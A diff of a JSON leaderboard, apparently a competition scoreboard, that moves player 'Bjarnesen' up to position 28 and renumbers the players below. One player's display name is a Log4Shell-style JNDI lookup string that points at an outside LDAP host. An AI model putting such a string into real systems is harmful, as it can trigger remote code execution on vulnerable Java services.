@@ -163,57 +163,57 @@
     },
     {
         "position": 28,
+        "user_id": "2ae260c2b9e19358d98bce35fc4b63f7",
+        "name": "Bjarnesen",
+        "points": 164
+    },
+    {
+        "position": 29,
         "user_id": "654dbc480cd0edf9ee8d90e66a34e92f",
         "name": "L\u00f8va",
         "points": 160
     },
     {
-        "position": 29,
+        "position": 30,
         "user_id": "b51236f49a73af15fe079842771011c8",
         "name": "0xman",
         "points": 160
     },
     {
-        "position": 30,
+        "position": 31,
         "user_id": "fbe2172f9ae264fc8a8703f215f4e517",
         "name": "Magnus",
         "points": 160
     },
     {
-        "position": 31,
+        "position": 32,
         "user_id": "72c1cc6250a04e68e141585023a3e41e",
         "name": "${jndi:ldap://anvilshop.utl/x}",
         "points": 160
     },
     {
-        "position": 32,
+        "position": 33,
         "user_id": "2a3c4718d2588ddd005eab90ba1fd351",
         "name": "FLINK BABBAGE",
         "points": 159
     },
     {
-        "position": 33,
+        "position": 34,
         "user_id": "31bfd41cc5450c78616f5d2d52fab4f6",
         "name": "neopoznannyy",
         "points": 157
     },
     {
-        "position": 34,
+        "position": 35,
         "user_id": "03330940e53fd97e6320f08080abe549",
         "name": "TAFATT ARTIST",
         "points": 157
     },
     {
-        "position": 35,
+        "position": 36,
         "user_id": "c796bd1573d821793708161c997cf9a6",
         "name": "Vealending",
         "points": 157
-    },
-    {
-        "position": 36,
-        "user_id": "2ae260c2b9e19358d98bce35fc4b63f7",
-        "name": "Bjarnesen",
-        "points": 154
     },
     {
         "position": 37,
